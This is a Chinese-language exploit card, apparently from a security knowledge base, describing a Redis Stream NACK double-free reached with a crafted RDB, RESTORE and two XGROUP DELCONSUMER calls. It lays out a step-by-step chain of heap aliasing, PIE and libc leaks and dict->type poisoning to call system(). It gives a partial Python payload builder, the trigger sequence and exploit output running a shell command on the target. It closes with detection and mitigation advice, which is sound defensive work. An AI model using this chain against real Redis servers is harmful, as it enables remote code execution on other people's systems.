---
id: binary-pwn-heap-redis-stream-nack-double-free-rce
title: Redis Stream NACK 共享导致 Double Free：恶意 RDB + DELCONSUMER 的堆利用 RCE
type: scenario
domain: binary
path: binary/pwn/heap
technique: redis-stream-nack-double-free-dict-type-poisoning
aliases:
- Redis Stream NACK Double Free
- CVE-2026-25243 绕过变种
- Redis RDB RESTORE 双重释放
- dict->type 投毒 RCE
- XGROUP DELCONSUMER double free
tags:
- redis
- double-free
- use-after-free
- heap-exploitation
- rdb
- restore
- dict-type-poisoning
- jemalloc
- rce
cve: []
severity: high
confidence: high
status: verified
affected_versions: 'Redis 6.2.22、7.4.9、8.6.4 受影响（原文逐版本实测）；Redis 8.8.0+ 经 PR #15081 修复'
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:09+08:00'
  notes: 已对照原文全文核对：恶意 RDB 共享 NACK、两次 DELCONSUMER double free、dictEntry 别名、PIE/libc 泄露、dict->type 投毒 system 链与实测输出一致；6.2.22/7.4.9/8.6.4 受影响及 8.8.0+ 修复描述一致。未验证点：未复跑 PoC；无独立 CVE 号（原文称 CVE-2026-25243 绕过变种），偏移依赖官方镜像。
---

## 一句话结论

构造恶意 RDB 用 `RESTORE` 载入，使同一 Consumer Group 的两个 Consumer 的 PEL 指向同一个 `streamNACK`；先后对两个 Consumer 执行 `XGROUP DELCONSUMER` 即对同一 chunk 二次 `free`，再通过堆喷制造两个对象共享内存，最终篡改 `dict->type->hashFunction` 为 `system`，用 `GET "<命令>"` 在 Redis 进程内执行任意命令。

## 原理

- Redis Stream 的 Consumer Group 用 PEL（Pending Entries List）记录“已读未 ACK”的消息，每个条目是一个堆分配的 `streamNACK` 结构（6.2/7.4 为 24 字节，8.6 为 64 字节）。
- 正常 RDB 加载会为每个 Consumer 的每个 PEL 条目独立分配 NACK。恶意 RDB 在 Consumer A 与 Consumer B 的 PEL 中写入同一个 `rawid`，加载后两条 PEL 记录指向同一个 `streamNACK` 对象。
- 这是 CVE-2026-25243 补丁的绕过变种：原补丁修复了一条 RDB 加载路径上的 NACK 共享，新向量从另一条代码路径制造同样的共享。
- 双重释放：
  ```text
  RESTORE s 0 <payload>        # A.PEL -> NACK_C, B.PEL -> NACK_C（共享）
  XGROUP DELCONSUMER s g A     # free(NACK_C)，B 仍持有悬垂指针
  XGROUP DELCONSUMER s g B     # 再次 free(NACK_C) → double free
  ```
  第二次 `free` 后，`NACK_C` 在分配器的 tcache bin 中出现两次。
- 堆喷与对象别名：连续两次同尺寸分配都会返回 `NACK_C`，于是两个不同的 Redis 对象（如 `kvobj`/`sdsdup`/`dictEntry`）指向同一块内存。攻击者可借此伪造 `dictEntry` 与 `robj`，用 `GETRANGE`/`SETRANGE` 构造任意读/写通道。
- 信息泄露：无需 `DEBUG` 命令：
  - Lua `string.format` 的 CClosure 泄露 PIE 基址；
  - 读取 `write@GOT` 结合 libc `write` 偏移泄露 libc 基址；
  - 通过 `server.db` 数组定位 `db[0].dict`。
- Endgame：在可控缓冲区（BUF）构造 fake `dictType`，把某个空 db 的 `dict->type` 指向它，并将 `hashFunction` 写成 `system`。之后执行 `GET "<shell_cmd>"`，正常 `dictFind` 调用链变成：
  ```c
  dictFind(db->dict, key)
    → dict->type->hashFunction(key)   // 被改为 system
    → system(key)
  ```
- 非破坏性设计：任意读走 ≤128 字节的有界 `GETRANGE`；写入前校验目标地址；RCE 只触发一次；利用后恢复 `dict->type`、`save`、`slowlog` 配置；刻意残留部分利用键（删除会触发二次释放导致崩溃）。

## 触发条件

- Redis 受影响版本（6.2.22 / 7.4.9 / 8.6.4 已验证；8.8.0+ 已修复）。
- 攻击者能执行 `RESTORE` 与 `XGROUP DELCONSUMER`，即需要已认证会话（设置 `requirepass` 时）或目标未授权暴露。
- 能向 Redis 发送任意命令（TCP 6379 可达）。
- 目标构建的偏移与分配器行为与利用脚本匹配；非官方构建需按 `calibrate.sh` 思路重新校准偏移（PIE/libc 符号、结构尺寸、chunk 大小）。
- 完整 RCE 链还依赖信息泄露成功与可控缓冲区地址稳定。

## 利用步骤

1. 用 Python + CRC64 共享库构造带共享 NACK 的 RDB 载荷（两个 Consumer 的 PEL 使用同一 `rawid`）。
2. 对目标执行 `RESTORE` 载入，确认 Consumer A/B 的 PEL 指向同一 NACK。
3. 依次 `XGROUP DELCONSUMER` 删除 A、B，完成 double free。
4. 用同尺寸分配做堆喷，使两个对象（如 dictEntry）别名同一 chunk。
5. Phase 1：用伪造的 `streamConsumer` 经 `XPENDING` 做单次 free 的 UAF 任意读，泄露 PIE 基址（或直接用 Lua CClosure 泄露）。
6. Phase 2：借 dictEntry 别名伪造 `robj`，用 `GETRANGE`/`SETRANGE` 建立任意读写。
7. Phase 3：读 `write@GOT` 得到 libc 基址，定位 `system` 与 `server.db`。
8. Phase 4：在 BUF 构造 fake `dictType`，投毒空 db 的 `dict->type`，执行 `GET "<命令>"` 触发 `system()`。
9. Phase 5：恢复 `dict->type`、`save`、`slowlog`，清理利用键（保留惰性残留键以免崩溃）。

## PoC

构造共享 NACK 的 RDB 载荷骨架：

```python
def build_df_payload(group=b"g", consumers=(b"A", b"B")):
    rawid = b"\x01" + b"\x00" * 15          # 两个 Consumer 使用同一 rawid
    mstime = struct.pack("<q", 1700000000000)
    p = bytes([RDB_TYPE_STREAM_LISTPACKS])
    p += rdb_len(0) + rdb_len(0)
    # ... stream metadata ...
    p += rdb_len(2)                          # 2 consumers
    for name in consumers:
        p += rdb_str(name) + mstime
        p += rdb_len(1)                      # consumer PEL size = 1
        p += rawid
    # ... group PEL / CRC64 ...
    return p
```

触发序列：

```text
RESTORE s 0 <payload>
XGROUP DELCONSUMER s g A      # free(NACK_C)
XGROUP DELCONSUMER s g B      # free(NACK_C) 再次 → double free
```

利用产物（原文实测输出）：

```text
[+] double free: shared dictEntry victim = k001
[+] PIE base = 0x59ddf91e9000
[+] libc base = 0x75a67ace8000 (write=0x75a67ade0340)
[*] poisoning empty db dict->type ...
[*] TRIGGER: GET 'id > /data/pwned_by_hermes && echo PWNED'
[+] CHAIN COMPLETE — RCE fired, target restored & functional
```

验证：

```bash
docker exec redis-vuln cat /data/pwned_by_hermes
# uid=999(redis) gid=999(redis) groups=999(redis)
redis-cli -a exploitme PING   # PONG，服务未崩溃
```

## 变体与关联

- 变体（版本适配）：同一原语在 6.2.22 用 dictEntry 伪造 + `dict->type` 投毒；7.4.9 用双 dictEntry 别名 + `server.commands->type` 投毒；8.6.4 用 kvstore 别名 + `kvstore.dtype.hashFunction` 投毒。
- 变体（信息泄露）：除 Lua CClosure/`write@GOT` 外，也可利用其他可读结构或崩溃地址泄露 PIE/libc。
- 变体（触发命令）：除 `RESTORE` + `XGROUP DELCONSUMER` 外，其他能造成同一 NACK 被释放两次的路径也可复用该原语；原文提示禁用命令不保证完全防御。
- 关联：CVE-2026-25243 原始修复只堵住一条 RDB 加载路径；本卡是其绕过变种，说明修复需覆盖所有 NACK 创建/引用路径。
- 边界：需要认证或未授权访问；非官方构建需重新校准偏移；分配器/版本差异会影响堆喷成功率。

## 检测与防御

- 升级：Redis ≥ 8.8.0（PR #15081 彻底修复）；这是唯一根治手段。
- 缓解（无法升级）：`rename-command RESTORE ""`，并限制/禁用 `XGROUP DELCONSUMER`；但原文明确这不保证完全防御，可能存在其他触发路径。
- 加固：始终设置 `requirepass`，Redis 不暴露公网，以非 root 用户运行，禁用 `DEBUG`/`EVAL` 等不必要命令。
- 检测：`RESTORE` 载入的 RDB 中出现多个 Consumer 引用同一 `rawid`；短时间成对出现 `RESTORE` + 连续 `XGROUP DELCONSUMER`；异常大/异常构造的 RDB 载荷。
- 检测：`GETRANGE`/`SETRANGE` 高频访问同一键、读取 `write@GOT` 附近地址；`GET` 的键内容像 shell 命令（含空格、重定向、`sh -c`）。
- 检测：Redis 进程异常派生 `sh`/`system` 子进程；`save`/`slowlog` 配置被临时修改后恢复；利用残留的 fake dictEntry/BUF 键。
- 防御：启用 Redis ACL 限制普通账号的 `RESTORE`、`XGROUP` 权限；对 Redis 命令做审计并基线化配置变更。
